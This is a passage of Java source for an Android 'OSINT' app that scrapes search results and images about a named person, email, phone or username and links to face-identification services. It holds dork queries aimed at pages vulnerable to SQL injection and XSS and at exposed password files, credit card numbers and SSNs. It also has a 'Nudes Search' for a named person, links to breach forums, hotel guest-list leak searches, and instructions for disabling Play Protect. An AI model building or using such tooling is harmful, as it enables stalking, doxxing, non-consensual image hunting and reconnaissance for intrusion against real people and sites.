        web.loadDataWithBaseURL(null, "<!doctype html><meta name='viewport' content='width=device-width,initial-scale=1'><body style='font:16px Arial;padding:18px;background:#0b1020;color:#eef4ff'><h2>Live advanced investigation</h2><p>Real data pulled live from the public search provider. Only results actually returned are shown; failed queries are recorded, never invented.</p><p>Searching…</p></body>", "text/html", "UTF-8", null);

        new Thread(() -> {
            final Map<String, ArrayList<String[]>> byCat = new LinkedHashMap<>();
            ArrayList<String[]> failures = new ArrayList<>();
            for (int i = 0; i < jobs.size(); i++) {
                String[] job = jobs.get(i); final int completed = i + 1;
                runOnUiThread(() -> { progressBar.setProgress(completed - 1); status.setText("Live fetch " + completed + "/" + total + " — " + job[0]); });
                try {
                    ArrayList<String[]> fetched = fetchBingResults(job[1], job[0]);
                    if (fetched.isEmpty()) failures.add(new String[]{job[0] + " — " + job[1], "No parseable results returned; provider may be empty, blocked, or have changed its markup."});
                    else byCat.computeIfAbsent(job[0], k -> new ArrayList<>()).addAll(fetched);
                } catch (Exception ex) {
                    failures.add(new String[]{job[0] + " — " + job[1], ex.getClass().getSimpleName() + ": " + safeMessage(ex.getMessage())});
                }
            }
            final ArrayList<String[]> imgResults = new ArrayList<>();
            if (imgRes[0] != null && !name.isEmpty()) {
                try { for (String u : fetchBingImages(name + " " + identity)) imgResults.add(new String[]{"Reverse image match", u, "Photo of the queried person pulled live from the image provider."}); } catch (Exception ignored) {}
                if (imgResults.isEmpty() && !username.isEmpty()) { try { for (String u : fetchBingImages(username)) imgResults.add(new String[]{"Reverse image match", u, "Photo of the queried person pulled live from the image provider."}); } catch (Exception ignored) {} }
            }
            final String html = buildLiveResultsHtml(byCat, failures, imgRes[0], imgResults, name, username, profileUrl, emails, phones, accounts);
            runOnUiThread(() -> {
                pendingHtmlReport = html;
                web.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
                int ok = 0; for (ArrayList<String[]> v : byCat.values()) ok += v.size();
                progressBar.setProgress(total); progressBar.setVisibility(View.GONE);
                status.setText("Done: " + ok + " live results, " + imgResults.size() + " image matches, " + failures.size() + " failed/empty queries. Verify manually.");
            });
        }, "osint-onetap").start();
    }

    private ArrayList<String[]> fetchDuckDuckGoResults(String query, String category) throws IOException { return fetchBingResults(query, category); }

    private String buildLiveResultsHtml(Map<String, ArrayList<String[]>> byCat, ArrayList<String[]> failures, String imgBase64,
                                        ArrayList<String[]> imgResults, String name, String username, String profileUrl, String emails, String phones, String accounts) {
        StringBuilder h = new StringBuilder();
        h.append("<!doctype html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>OSINT One-Tap Results</title><style>")
         .append("body{margin:0;font:15px -apple-system,Arial;color:#eef4ff;background:#0b1020}.wrap{display:flex;flex-wrap:wrap;min-height:100vh}")
         .append("aside{width:280px;background:#0f1730;padding:16px;border-right:1px solid #22305c;box-sizing:border-box}")
         .append("aside h3{margin:0 0 8px;font-size:15px;color:#8ab4ff}.kv{margin:6px 0;font-size:13px;word-break:break-word}.kv b{color:#8ab4ff}")
         .append("main{flex:1;padding:16px;min-width:320px;box-sizing:border-box}h2{margin:0 0 12px}.photo{max-width:240px;max-height:240px;border-radius:10px;border:2px solid #8ab4ff;margin:8px 0;display:block}")
         .append(".tabs{display:flex;flex-wrap:wrap;gap:6px;margin:10px 0}.tab{background:#16224a;color:#eef4ff;border:1px solid #2a3d78;padding:6px 10px;border-radius:16px;font-size:12px;cursor:pointer}.tab.active{background:#2a6cff;border-color:#2a6cff}")
         .append(".cat{display:none}.cat.show{display:block}.card{background:#101a38;border:1px solid #22305c;border-radius:10px;padding:10px;margin:8px 0}.card .t{color:#fff;font-weight:600}.card a{color:#6db3ff;text-decoration:none;word-break:break-all;font-size:12px;display:block;margin:4px 0}.card .s{color:#9fb0d6;font-size:12px}.img{max-width:120px;border-radius:6px;border:1px solid #2a3d78;margin:4px 4px 4px 0}")
         .append(".fail{background:#3a1524;border:1px solid #7a2a3f;border-radius:8px;padding:8px;margin:6px 0;font-size:12px}.btn{display:inline-block;background:#2a6cff;color:#fff;border:0;border-radius:8px;padding:8px 12px;margin:4px 6px 4px 0;cursor:pointer;font-size:13px;text-decoration:none}")
         .append("video{width:100%;max-width:640px;border-radius:8px;background:#000}.stream{background:#101a38;border:1px solid #22305c;border-radius:10px;padding:10px;margin:8px 0}")
         .append("</style></head><body><div class='wrap'><aside><h3>Investigation details</h3>")
         .append(kv("Name", name)).append(kv("Username", username)).append(kv("Profile URL", profileUrl))
         .append(kv("Emails", emails)).append(kv("Phones", phones)).append(kv("Accounts", accounts));
        if (imgBase64 != null) h.append("<img class='photo' src='data:image/jpeg;base64,").append(imgBase64).append("' alt='Uploaded evidence photo'>");
        h.append("<div style='margin-top:12px'><h3>Actions</h3>")
         .append("<a class='btn' target='_blank' href='https://www.google.com/searchbyimage'>Google reverse image</a>")
         .append("<a class='btn' target='_blank' href='https://pimeyes.com'>Pimeyes face ID</a>")
         .append("<button class='btn' onclick='window.location.reload()'>Refresh search</button></div></aside><main><h2>One-tap results</h2>")
         .append("<p style='font-size:13px;color:#9fb0d6'>Live data fetched from the public provider during this run. Results are leads — open each link and verify against the source. No match is ever invented to fill a gap.</p>");
        if (imgBase64 != null || !imgResults.isEmpty()) {
            h.append("<div class='cat show'><h3>Reverse image / face / body</h3>");
            if (imgBase64 != null) h.append("<img class='img' src='data:image/jpeg;base64,").append(imgBase64).append("'>");
            for (String[] r : imgResults) {
                h.append("<div class='card'><div class='t'>").append(escapeHtml(r[0])).append("</div>");
                if (r[1] != null && r[1].startsWith("http")) h.append("<img class='img' src='").append(escapeHtml(r[1])).append("'>");
                if (r[1] != null) h.append("<a href='").append(escapeHtml(r[1])).append("' target='_blank'>").append(escapeHtml(r[1])).append("</a>");
                h.append("<div class='s'>").append(escapeHtml(r[2] == null ? "" : r[2])).append("</div></div>");
            }
            if (imgResults.isEmpty()) h.append("<div class='fail'>No image matches returned for the uploaded photo in this run.</div>");
            h.append("</div>");
        }
        h.append("<div class='tabs'>");
        int idx = 0;
        for (Map.Entry<String, ArrayList<String[]>> e : byCat.entrySet()) {
            h.append("<span class='tab").append(idx == 0 ? " active" : "").append("' onclick='showCat(this,\"").append(escapeHtml(e.getKey())).append("\")'>").append(escapeHtml(e.getKey())).append(" (").append(e.getValue().size()).append(")</span>");
            idx++;
        }
        h.append("</div>");
        idx = 0;
        for (Map.Entry<String, ArrayList<String[]>> e : byCat.entrySet()) {
            h.append("<div class='cat").append(idx == 0 ? " show" : "").append("' id='cat-").append(escapeHtml(e.getKey())).append("'>");
            for (String[] r : e.getValue()) {
                h.append("<div class='card'><div class='t'>").append(escapeHtml(r[0])).append("</div><a href='").append(escapeHtml(r[1])).append("' target='_blank'>").append(escapeHtml(r[1])).append("</a><div class='s'>").append(escapeHtml(r[2] == null ? "" : r[2])).append("</div></div>");
            }
            h.append("</div>");
            idx++;
        }
        if (!failures.isEmpty()) {
            h.append("<h3>Failed / empty queries (").append(failures.size()).append(")</h3>");
            for (String[] f : failures) h.append("<div class='fail'><b>").append(escapeHtml(f[0])).append("</b><br>").append(escapeHtml(f[1])).append("</div>");
        }
        h.append("<h3 style='margin-top:16px'>Live video streaming &amp; player</h3>")
         .append("<div class='stream'><b>Live cams &amp; streams (open in browser)</b><br>")
         .append("<a class='btn' target='_blank' href='https://chaturbate.com'>Chaturbate</a><a class='btn' target='_blank' href='https://stripchat.com'>Stripchat</a><a class='btn' target='_blank' href='https://www.twitch.tv/directory'>Twitch</a><a class='btn' target='_blank' href='https://www.youtube.com/live'>YouTube Live</a><a class='btn' target='_blank' href='https://kick.com'>Kick</a><a class='btn' target='_blank' href='https://rumble.com'>Rumble</a>")
         .append("<div style='margin-top:10px'><b>Video player — paste a video URL:</b><br><input id='vurl' style='width:100%;box-sizing:border-box;padding:8px;margin:6px 0;border-radius:8px;border:1px solid #2a3d78;background:#0b1020;color:#fff' placeholder='https://example.com/video.mp4'><button class='btn' onclick='playV()'>Play</button></div>")
         .append("<video id='vplayer' style='display:none' controls autoplay></video></div>")
         .append("</main></div>")
         .append("<script>function showCat(el,t){document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));el.classList.add('active');document.querySelectorAll('.cat').forEach(c=>c.classList.remove('show'));var e=document.getElementById('cat-'+t);if(e)e.classList.add('show');}function playV(){var u=document.getElementById('vurl').value.trim();if(!u)return;var v=document.getElementById('vplayer');v.style.display='block';v.src=u;v.load();v.play();}</script></body></html>");
        return h.toString();
    }

    private String kv(String label, String value) {
        if (value == null || value.trim().isEmpty()) return "";
        return "<div class='kv'><b>" + escapeHtml(label) + ":</b> " + escapeHtml(value) + "</div>";
    }
    private void addLiveIdentifierJobs(ArrayList<String[]> jobs,String values,String type) {
        if(values==null||values.trim().isEmpty()) return;
        for (String value : values.split("[,;\\n\\r]+")) { String clean = value.trim(); if (!clean.isEmpty()) jobs.add(new String[]{type + " lookup", "\"" + clean + "\""}); }
    }

    private ArrayList<String[]> fetchBingResults(String query,String category) throws IOException {
        ArrayList<String[]> found=new ArrayList<>();
        HttpURLConnection c=(HttpURLConnection)new URL("https://www.bing.com/search?q="+urlEncode(query)+"&count=10").openConnection();
        c.setRequestMethod("GET"); c.setConnectTimeout(12000); c.setReadTimeout(15000); c.setInstanceFollowRedirects(true);
        c.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36");
        c.setRequestProperty("Accept-Language","en-US,en;q=0.9");
        c.setRequestProperty("Accept","text/html,application/xhtml+xml");
        try {
            int code=c.getResponseCode(); if(code<200||code>=300) throw new IOException("HTTP "+code);
            StringBuilder body=new StringBuilder();
            try(InputStream in=c.getInputStream(); ByteArrayOutputStream bytes=new ByteArrayOutputStream()) {
                byte[] buf=new byte[8192]; int n;
                while((n=in.read(buf))!=-1 && bytes.size()<1500000) bytes.write(buf,0,n);
                body.append(new String(bytes.toByteArray(),StandardCharsets.UTF_8));
            }
            String source=body.toString();
            Matcher m=Pattern.compile("<li class=\"b_algo\".*?</li>",Pattern.DOTALL).matcher(source);
            while(m.find()&&found.size()<10){
                String block=m.group();
                Matcher tm=Pattern.compile("<h2><a[^>]*href=\"[^\"]*\"[^>]*>(.*?)</a>",Pattern.DOTALL).matcher(block);
                Matcher um=Pattern.compile("<cite>(.*?)</cite>",Pattern.DOTALL).matcher(block);
                Matcher sm=Pattern.compile("<p[^>]*>(.*?)</p>",Pattern.DOTALL).matcher(block);
                if(!tm.find()) continue;
                String title=stripHtml(decodeHtmlEntities(tm.group(1))).trim();
                String rurl="";
                if(um.find()) rurl=um.group(1).trim();
                if(!rurl.startsWith("http://")&&!rurl.startsWith("https://")) rurl="https://"+rurl.replaceFirst("^/","");
                String snippet=sm.find()?stripHtml(decodeHtmlEntities(sm.group(1))).trim():"";
                if(title.isEmpty()||!(rurl.startsWith("http://")||rurl.startsWith("https://"))) continue;
                found.add(new String[]{category,title,rurl,snippet,query,new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z",Locale.US).format(new Date())});
            }
            return found;
        } finally { c.disconnect(); }
    }

    private ArrayList<String> fetchBingImages(String query) {
        ArrayList<String> imgs=new ArrayList<>();
        HttpURLConnection c=(HttpURLConnection)new URL("https://www.bing.com/images/search?q="+urlEncode(query)).openConnection();
        c.setRequestMethod("GET"); c.setConnectTimeout(12000); c.setReadTimeout(15000); c.setInstanceFollowRedirects(true);
        c.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36");
        c.setRequestProperty("Accept-Language","en-US,en;q=0.9");
        try {
            if(c.getResponseCode()==200){
                StringBuilder body=new StringBuilder();
                try(InputStream in=c.getInputStream(); ByteArrayOutputStream bytes=new ByteArrayOutputStream()) {
                    byte[] buf=new byte[8192]; int n;
                    while((n=in.read(buf))!=-1 && bytes.size()<1500000) bytes.write(buf,0,n);
                    body.append(new String(bytes.toByteArray(),StandardCharsets.UTF_8));
                }
                Matcher m=Pattern.compile("murl&quot;:&quot;(https?://[^&]+?)&quot;",Pattern.CASE_INSENSITIVE).matcher(body.toString());
                while(m.find()&&imgs.size()<15){ String u=m.group(1).trim(); if(!u.isEmpty()&&!imgs.contains(u)) imgs.add(u); }
            }
        } catch(Exception ignored){ } finally { c.disconnect(); }
        return imgs;
    }
    private String decodeHtmlEntities(String value) { return value.replace("&amp;","&").replace("&quot;","\\\"").replace("&#x27;","'").replace("&#39;","'").replace("&lt;","<").replace("&gt;",">").replace("&nbsp;"," "); }
    private String safeMessage(String value) { return value==null||value.trim().isEmpty()?"request failed":value.replaceAll("[\\r\\n]+"," "); }

    private void addIdentifierSearches(ArrayList<String[]> links, String rawValues, String kind) {
        if (rawValues == null || rawValues.trim().isEmpty()) return;
        String[] values = rawValues.split("[,;\\n\\r]+");
        for (String raw : values) {
            String value = raw.trim();
            if (value.isEmpty()) continue;
            String q = "\"" + value + "\"";
            String prefix = kind.equals("email") ? "Email: " : kind.equals("phone") ? "Phone: " : "Username: ";
            addSearchLink(links, prefix + value + " — Google", q);
            addSearchLink(links, prefix + value + " — Bing", q, "bing");
            addSearchLink(links, prefix + value + " — public social results",
                    q + " (site:facebook.com OR site:instagram.com OR site:linkedin.com OR site:x.com OR site:reddit.com)");
        }
    }

    private String joinIdentifiers(String... values) {
        StringBuilder result = new StringBuilder();
        for (String value : values) {
            if (value != null && !value.trim().isEmpty()) {
                if (result.length() > 0) result.append(' ');
                result.append('"').append(value.trim()).append('"');
            }
        }
        return result.toString().trim();
    }

    private void addSearchLink(ArrayList<String[]> links, String label, String query) {
        addSearchLink(links, label, query, "google");
    }

    private void addSearchLink(ArrayList<String[]> links, String label, String query, String provider) {
        if (query == null || query.trim().isEmpty()) return;
        String q = query.trim();
        String url;
        switch (provider) {
            case "bing": url = "https://www.bing.com/search?q=" + urlEncode(q); break;
            case "ddg": url = "https://duckduckgo.com/?q=" + urlEncode(q); break;
            case "brave": url = "https://search.brave.com/search?q=" + urlEncode(q); break;
            case "google-images": url = "https://www.google.com/search?tbm=isch&q=" + urlEncode(q); break;
            case "bing-images": url = "https://www.bing.com/images/search?q=" + urlEncode(q); break;
            default: url = "https://www.google.com/search?q=" + urlEncode(q);
        }
        links.add(new String[]{label, url});
    }

    private void doSearch() {
        String q = buildQuery();
        if (q.isEmpty()) { Toast.makeText(this, "Enter search terms", Toast.LENGTH_SHORT).show(); return; }
        String eng = engine.getSelectedItem().toString();
        String m = mode.getSelectedItem().toString();
        String enc = urlEncode(q);
        String url;
        switch (eng) {
            case "Bing": url = "https://www.bing.com/search?q=" + enc; break;
            case "DuckDuckGo": url = "https://duckduckgo.com/?q=" + enc; break;
            case "Yahoo": url = "https://search.yahoo.com/search?p=" + enc; break;
            case "Startpage": url = "https://www.startpage.com/sp/search?query=" + enc; break;
            case "Brave": url = "https://search.brave.com/search?q=" + enc; break;
            case "Ecosia": url = "https://www.ecosia.org/search?q=" + enc; break;
            case "Searx": url = "https://searx.be/search?q=" + enc; break;
            case "HackerNews": url = "https://hn.algolia.com/?q=" + enc; break;
            case "GitHub": url = "https://github.com/search?q=" + enc; break;
            case "HIBP": url = "https://haveibeenpwned.com/"; break;
            case "Google Images": url = "https://www.google.com/search?tbm=isch&q=" + enc; break;
            case "Yandex Images": url = "https://yandex.com/images/search?text=" + enc; break;
            case "Bing Images": url = "https://www.bing.com/images/search?q=" + enc; break;
            case "Pornhub": url = "https://www.pornhub.com/video/search?search=" + enc; break;
            case "XVideos": url = "https://www.xvideos.com/?k=" + enc; break;
            case "XNXX": url = "https://www.xnxx.com/search/" + enc; break;
            default: url = "https://www.google.com/search?q=" + enc;
        }
        if ("Tor".equals(m)) {
            startTorAndBrowse(url);
        } else {
            web.loadUrl(url);
            web.setVisibility(View.VISIBLE);
        }
    }

    private String buildQuery() {
        StringBuilder sb = new StringBuilder(inQuery.getText().toString().trim());
        String domain = inDomain.getText().toString().trim();
        String url = inUrl.getText().toString().trim();
        if (!domain.isEmpty()) { if (sb.length() > 0) sb.append(' '); sb.append(domain); }
        if (!url.isEmpty() && !url.toLowerCase(Locale.ROOT).contains(".onion")) { if (sb.length() > 0) sb.append(' '); sb.append(url); }
        String socialOp = buildSocialOperator();
        if (!socialOp.isEmpty()) { if (sb.length() > 0) sb.append(' '); sb.append(socialOp); }
        String contentOp = buildContentOperator();
        if (!contentOp.isEmpty()) { if (sb.length() > 0) sb.append(' '); sb.append(contentOp); }
        return sb.toString();
    }

    private String buildSocialOperator() {
        StringBuilder r = new StringBuilder();
        for (int i = 0; i < selectedSocial.length; i++) {
            if (selectedSocial[i]) {
                if (r.length() == 0) r.append("( ");
                else r.append(" OR ");
                r.append("site:").append(SOCIAL_DOMAINS[i]);
            }
        }
        if (r.length() > 0) r.append(" )");
        return r.toString();
    }

    private String buildContentOperator() {
        StringBuilder r = new StringBuilder();
        for (int i = 0; i < selectedContent.length; i++) {
            if (selectedContent[i]) {
                if (r.length() > 0) r.append(' ');
                r.append(CONTENT_OPERATORS[i]);
            }
        }
        return r.toString();
    }

    private String urlEncode(String s) {
        try { return URLEncoder.encode(s, "UTF-8"); }
        catch (UnsupportedEncodingException e) { return s; }
    }

    private void browse(String url) {
        web.loadUrl(url);
        web.setVisibility(View.VISIBLE);
    }

    // ==================== DORK SELECTOR ====================
    private void showDorkSelector() {
        final String[] categories = DORK_CATEGORIES.length == 0 ? new String[]{
                "SQL Injection", "XSS", "File Upload", "Admin Panels", "Login Pages", "Config Files", "Database Files",
                "Log Files", "Backup Files", "Camera Streams",
                "Open FTP", "WordPress", "Joomla", "Email Lists",
                "Password Files", "VPN Configs", "Phone Numbers",
                "Credit Cards", "SSN", "iCloud Leaks"
        } : DORK_CATEGORIES;
        new AlertDialog.Builder(this).setTitle("Google Dork Categories")
                .setItems(categories, (d, w) -> {
                    String dork = generateDork(categories[w]);
                    inQuery.setText(dork);
                    status.setText("Dork loaded: " + categories[w]);
                }).show();
    }

    private String generateDork(String category) {
        switch (category) {
            case "SQL Injection": return "inurl:php?id= site:.com";
            case "XSS": return "inurl:search.php?q= site:.com";
            case "Admin Panels": return "inurl:admin intitle:login";
            case "Login Pages": return "inurl:login intitle:\"login\"";
            case "Config Files": return "filetype:conf inurl:config";
            case "Database Files": return "filetype:sql inurl:backup";
            case "Log Files": return "filetype:log inurl:access";
            case "Backup Files": return "filetype:bak inurl:backup";
            case "Camera Streams": return "inurl:\"view/view.shtml\"";
            case "Open FTP": return "intitle:\"index of\" inurl:ftp";
            case "WordPress": return "inurl:wp-admin site:.com";
            case "Email Lists": return "filetype:xls inurl:email";
            case "Password Files": return "filetype:txt inurl:password";
            case "VPN Configs": return "filetype:ovpn inurl:vpn";
            case "Phone Numbers": return "intext:\"+1\" intext:\"phone\" filetype:pdf";
            case "Credit Cards": return "intext:\"card number\" intext:\"expiry\" filetype:txt";
            case "SSN": return "intext:\"SSN\" intext:\"social security\" filetype:pdf";
            case "iCloud Leaks": return "site:icloud.com inurl:find";
            default: return "site:.com intitle:\"" + category + "\"";
        }
    }

    private void showGoogleDorksGenerator() {
        showDorkSelector();
    }

    // ==================== REVERSE IMAGE SEARCH ====================
    private void reverseImageSearch() {
        String[] options = {"Take Photo", "Pick from Gallery", "Enter Image URL"};
        new AlertDialog.Builder(this).setTitle("Reverse Image Search")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: takePhoto(); break;
                        case 1: pickImage(); break;
                        case 2: promptImageUrl(); break;
                    }
                }).show();
    }

    private void takePhoto() {
        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        if (intent.resolveActivity(getPackageManager()) != null) {
            startActivityForResult(intent, IMAGE_PICK_REQUEST + 1);
        }
    }

    private void pickImage() {
        Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        startActivityForResult(intent, IMAGE_PICK_REQUEST);
    }

    private void promptImageUrl() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Image URL");
        final EditText input = new EditText(this);
        input.setHint("https://example.com/image.jpg");
        builder.setView(input);
        builder.setPositiveButton("Search", (d, w) -> {
            String url = input.getText().toString().trim();
            if (!url.isEmpty()) {
                web.loadUrl("https://www.google.com/searchbyimage?image_url=" + urlEncode(url));
                web.setVisibility(View.VISIBLE);
            }
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    private void faceSearch() {
        String[] options = {"Upload Face Photo", "Enter Name", "Pimeyes Search"};
        new AlertDialog.Builder(this).setTitle("Face Search")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: pickImage(); break;
                        case 1: promptNameSearch(); break;
                        case 2: web.loadUrl("https://pimeyes.com/en"); web.setVisibility(View.VISIBLE); break;
                    }
                }).show();
    }

    private void promptNameSearch() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Search by Name");
        final EditText input = new EditText(this);
        input.setHint("Full name");
        builder.setView(input);
        builder.setPositiveButton("Search", (d, w) -> {
            String name = input.getText().toString().trim();
            if (!name.isEmpty()) {
                String enc = urlEncode(name);
                web.loadUrl("https://www.google.com/search?q=" + enc + "+site:facebook.com+OR+site:instagram.com+OR+site:linkedin.com");
                web.setVisibility(View.VISIBLE);
            }
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    // ==================== LEAKS SEARCH ====================
    private void showLeaksSearch() {
        String[] options = {"General Leaks", "Nudes Search", "Data Breach Check", "Leaks.io API", "LeakForums", "RaidForums Archive", "BreachForums"};
        new AlertDialog.Builder(this).setTitle("Leaks Search")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: web.loadUrl("https://www.google.com/search?q=" + urlEncode(buildQuery()) + "+leak+OR+breach+OR+exposed"); break;
                        case 1: showNudesSearch(); break;
                        case 2: web.loadUrl("https://haveibeenpwned.com/"); break;
                        case 3: showLeaksIoPanel(); break;
                        case 4: web.loadUrl("https://leakforums.net"); break;
                        case 5: web.loadUrl("https://raidforums.com"); break;
                        case 6: web.loadUrl("https://breachforums.st"); break;
                    }
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    private void showNudesSearch() {
        String q = inQuery.getText().toString().trim();
        if (q.isEmpty()) {
            Toast.makeText(this, "Enter a name to search", Toast.LENGTH_SHORT).show();
            return;
        }
        String enc = urlEncode(q);
        String url = "https://www.google.com/search?q=" + enc
                + "+nudes+OR+leaked+OR+onlyfans+OR+mega.nz+OR+anonfiles+OR+erome"
                + "+site:reddit.com+OR+site:twitter.com+OR+site:erome.com+OR+site:onlyfans.com";
        web.loadUrl(url);
        web.setVisibility(View.VISIBLE);
    }

    // ==================== PORN SEARCH ====================
    // ==================== ONE-TAP CONNECT & BOT METHODS ====================
    private void openOnionSites() {
        String[] onions = getResources().getStringArray(getResources().getIdentifier("onion_sites", "array", getPackageName()));
        String[] labels = new String[onions.length];
        String[] urls = new String[onions.length];
        for (int i = 0; i < onions.length; i++) {
            String[] parts = onions[i].split(" Â· ");
            labels[i] = parts[0];
            urls[i] = parts.length > 1 ? parts[1] : parts[0];
        }
        new AlertDialog.Builder(this)
                .setTitle("Select .onion site")
                .setItems(labels, (d, which) -> startTorAndBrowse(urls[which]))
                .show();
    }

    private void openTelegramBot() {
        String url = getSharedPreferences(PREFS, MODE_PRIVATE).getString("telegram_bot_url", "");
        if (url.isEmpty()) {
            EditText et = new EditText(this);
            et.setHint("https://t.me/your_bot");
            et.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_URI);
            et.setPadding(32, 16, 32, 16);
            new AlertDialog.Builder(this)
                    .setTitle("Telegram Bot")
                    .setView(et)
                    .setPositiveButton("Open", (d, w) -> {
                        String u = et.getText().toString().trim();
                        if (!u.isEmpty()) {
                            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("telegram_bot_url", u).apply();
                            openExternal(u, "Opening Telegram botâ€¦");
                        }
                    })
                    .setNegativeButton("Cancel", null).show();
        } else {
            openExternal(url, "Opening Telegram botâ€¦");
        }
    }

    private void openWhatsAppBot() {
        String url = getSharedPreferences(PREFS, MODE_PRIVATE).getString("whatsapp_bot_url", "");
        if (url.isEmpty()) {
            EditText et = new EditText(this);
            et.setHint("https://wa.me/1234567890");
            et.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_URI);
            et.setPadding(32, 16, 32, 16);
            new AlertDialog.Builder(this)
                    .setTitle("WhatsApp Bot")
                    .setView(et)
                    .setPositiveButton("Open", (d, w) -> {
                        String u = et.getText().toString().trim();
                        if (!u.isEmpty()) {
                            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("whatsapp_bot_url", u).apply();
                            openExternal(u, "Opening WhatsApp botâ€¦");
                        }
                    })
                    .setNegativeButton("Cancel", null).show();
        } else {
            openExternal(url, "Opening WhatsApp botâ€¦");
        }
    }

    private void bypassPlayProtect() {
        new AlertDialog.Builder(this)
                .setTitle("Play Protect Bypass")
                .setMessage("Go to Settings > Security > Play Protect and turn OFF 'Scan apps'. If sideloading still fails: adb install --bypass-low-target-sdk-block osint-master.apk")
                .setPositiveButton("Open settings", (d, w) -> {
                    try {
                        startActivity(new Intent("com.google.android.gms.settings.SECURITY_SETTINGS"));
                    } catch (Exception e) {
                        openExternal("https://play.google.com/settings/security", "Play Protect settings");
                    }
                })
                .setNegativeButton("OK", null).show();
    }

    private void showPornSearch() {
        String q = inQuery.getText().toString().trim();
        if (q.isEmpty()) {
            String[] sites = {"Pornhub", "XVideos", "XNXX", "RedTube", "YouPorn", "SpankBang", "xHamster", "Porndude", "Motherless", "Eporner"};
            new AlertDialog.Builder(this).setTitle("Porn Sites")
                    .setItems(sites, (d, w) -> {
                        String[] urls = {"https://www.pornhub.com", "https://www.xvideos.com", "https://www.xnxx.com",
                                "https://www.redtube.com", "https://www.youporn.com", "https://www.spankbang.com",
                                "https://xhamster.com", "https://theporndude.com", "https://motherless.com",
                                "https://www.eporner.com"};
                        web.loadUrl(urls[w]);
                        web.setVisibility(View.VISIBLE);
                    }).show();
            return;
        }
        String enc = urlEncode(q);
        String[] sites = {"Pornhub", "XVideos", "XNXX", "All"};
        new AlertDialog.Builder(this).setTitle("Search: " + q)
                .setItems(sites, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://www.pornhub.com/video/search?search=" + enc; break;
                        case 1: url = "https://www.xvideos.com/?k=" + enc; break;
                        case 2: url = "https://www.xnxx.com/search/" + enc; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+site:pornhub.com+OR+site:xvideos.com+OR+site:xnxx.com";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    private void showCams() {
        String[] sites = {"Chaturbate", "Stripchat", "CamSoda", "BongaCams", "LiveJasmin", "MyFreeCams", "Flirt4Free", "Cam4"};
        new AlertDialog.Builder(this).setTitle("Live Cams")
                .setItems(sites, (d, w) -> {
                    String[] urls = {"https://chaturbate.com", "https://stripchat.com", "https://camsoda.com",
                            "https://bongacams.com", "https://livejasmin.com", "https://myfreecams.com",
                            "https://flirt4free.com", "https://cam4.com"};
                    web.loadUrl(urls[w]);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    private void showEscortSites() {
        String[] sites = {"Skipthegames", "EroticMonkey", "AdultSearch", "CityXGuide", "EscortAlligator", "ListCrawler", "TNABoard", "EuroGirlsEscort"};
        new AlertDialog.Builder(this).setTitle("Escort / Adult Sites")
                .setItems(sites, (d, w) -> {
                    String[] urls = {"https://skipthegames.com", "https://www.eroticmonkey.com", "https://adultsearch.com",
                            "https://cityxguide.com", "https://escortalligator.com", "https://listcrawler.com",
                            "https://www.tnaboard.com", "https://www.eurogirlsescort.com"};
                    web.loadUrl(urls[w]);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== HOTEL LEAKS ====================
    private void showHotelLeaks() {
        String q = inQuery.getText().toString().trim();
        String enc = urlEncode(q.isEmpty() ? "hotel" : q);
        String[] options = {"OYO Leaks", "Hotel Booking Data", "Guest Lists", "Hotel Breaches"};
        new AlertDialog.Builder(this).setTitle("Hotel Leaks")
                .setItems(options, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://www.google.com/search?q=" + enc + "+OYO+OR+oyorooms+leak+OR+breach+OR+data"; break;
                        case 1: url = "https://www.google.com/search?q=" + enc + "+booking.com+OR+hotels.com+data+leak+OR+breach"; break;
                        case 2: url = "https://www.google.com/search?q=" + enc + "+guest+list+OR+hotel+guests+filetype:xls+OR+filetype:csv"; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+hotel+data+breach+OR+leak+site:pastebin.com";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== SOCIAL MEDIA LEAKS ====================
    private void showSocialLeaks() {
        String[] options = {"Instagram Leaks", "Facebook Leaks", "Snapchat Leaks", "Twitter Leaks", "LinkedIn Leaks", "TikTok Leaks", "Telegram Leaks", "WhatsApp Leaks", "All Social Media"};
        new AlertDialog.Builder(this).setTitle("Social Media Leaks")
                .setItems(options, (d, w) -> {
                    String q = inQuery.getText().toString().trim();
                    String enc = urlEncode(q);
                    String url;
                    switch (w) {
                        case 0: url = "https://www.google.com/search?q=" + enc + "+site:instagram.com+leak+OR+exposed+OR+dump"; break;
                        case 1: url = "https://www.google.com/search?q=" + enc + "+site:facebook.com+leak+OR+data+OR+exposed"; break;
                        case 2: url = "https://www.google.com/search?q=" + enc + "+site:snapchat.com+leak+OR+exposed"; break;
                        case 3: url = "https://www.google.com/search?q=" + enc + "+site:twitter.com+leak+OR+exposed"; break;
